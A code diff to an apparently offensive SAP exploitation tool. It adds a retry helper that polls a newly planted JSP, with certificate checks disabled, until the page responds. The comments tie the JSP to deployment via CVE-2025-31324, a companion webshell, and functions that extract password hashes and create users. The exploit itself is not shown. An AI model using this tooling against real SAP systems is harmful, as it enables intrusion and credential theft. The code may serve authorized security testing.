@@ -39,6 +39,65 @@ from sapmap_exploit import (
 logger = logging.getLogger(__name__)
 
 
+# ---------------------------------------------------------------------------
+# Jasper-compile race helper — exported so sap_java_secstore_runner can
+# share the same retry policy.  Tomcat compiles JSPs lazily on first
+# request and the page-cache view of a freshly-written file can lag the
+# disk write by a second or two on a busy node.  Polling with backoff
+# turns the would-be HTTP 404 into a 200 once compilation finishes.
+# ---------------------------------------------------------------------------
+
+def _wait_for_jsp_ready(jsp_url: str, sid: str = "?",
+                          label: str = "JSP",
+                          delays=(0, 1, 2, 3, 5, 8)) -> bool:
+    """Poll the given URL until it answers HTTP 200, or until the
+    full retry budget is exhausted.  Returns True on success, False on
+    sustained failure.  Each attempt is logged with the cumulative
+    elapsed time so the operator sees the wait happening.
+
+    Default budget: 0+1+2+3+5+8 = 19 s across 6 attempts.  Same as
+    deploy_create_user_jsp_via_cve_31324's post-write probe.
+
+    A GET (no params) is sufficient — most SAPMAP JSPs respond 200
+    with a small status banner when called without args, which is
+    exactly the readiness signal we want.
+    """
+    import time as _time
+    import urllib.request as _urlreq
+    import urllib.error as _urlerr
+    import ssl as _ssl
+
+    elapsed = 0
+    last_status = 0
+    last_err = ""
+    for attempt, delay in enumerate(delays, 1):
+        if delay:
+            _time.sleep(delay)
+            elapsed += delay
+        try:
+            ctx = _ssl._create_unverified_context()
+            req = _urlreq.Request(jsp_url, headers={"User-Agent": "SAPMAP/1.0"})
+            with _urlreq.urlopen(req, timeout=10, context=ctx) as r:
+                last_status = r.status
+        except _urlerr.HTTPError as e:
+            last_status = e.code
+            last_err = ""
+        except (_urlerr.URLError, TimeoutError, OSError) as e:
+            last_status = 0
+            last_err = str(e)
+        if last_status == 200:
+            if attempt > 1:
+                print(f"[*] {sid}: {label} ready after attempt "
+                      f"{attempt} ({elapsed}s of compile-window wait)")
+            return True
+        print(f"[*] {sid}: {label} probe attempt {attempt}/{len(delays)} → "
+              f"HTTP {last_status or 'error'}"
+              + (f" ({last_err})" if last_err else "")
+              + ("; compilation may still be pending"
+                 if last_status == 404 else "; will retry"))
+    return False
+
+
 def _ensure_java_db_jsp(node: SAPNode) -> str:
     """Return the URL of a deployed JDBC-query JSP on `node`, deploying one
     via CVE-2025-31324 or GW SAPXPG if not already present.
@@ -172,6 +231,18 @@ def _ensure_java_db_jsp(node: SAPNode) -> str:
         return ""
 
     print(f"[+] {node.sid}: JDBC-query JSP at {jsp_url}")
+    # Warm-up probe: Tomcat/Jasper compiles JSPs lazily on first
+    # request, and the page-cache view of a freshly-written file can
+    # lag the disk write by a second or two on a busy J2EE node.
+    # Without this loop, the very first invoke_jdbc_query() call from
+    # extract_java_password_hashes / assess_java_impact /
+    # read_java_destinations frequently saw HTTP 404 even though the
+    # webshell sibling had just served the chunked write.  Same retry
+    # budget as deploy_create_user_jsp_via_cve_31324 (~19 s).
+    if not _wait_for_jsp_ready(jsp_url, sid=node.sid, label="JDBC JSP"):
+        print(f"[-] {node.sid}: JDBC JSP {jsp_url} never became reachable "
+              f"after compile-window retries — caller may still try to "
+              f"use it but expect HTTP 404")
     node.java_db_jsps.append({
         "url": jsp_url,
         "deployed_at": _dt.now().isoformat(),
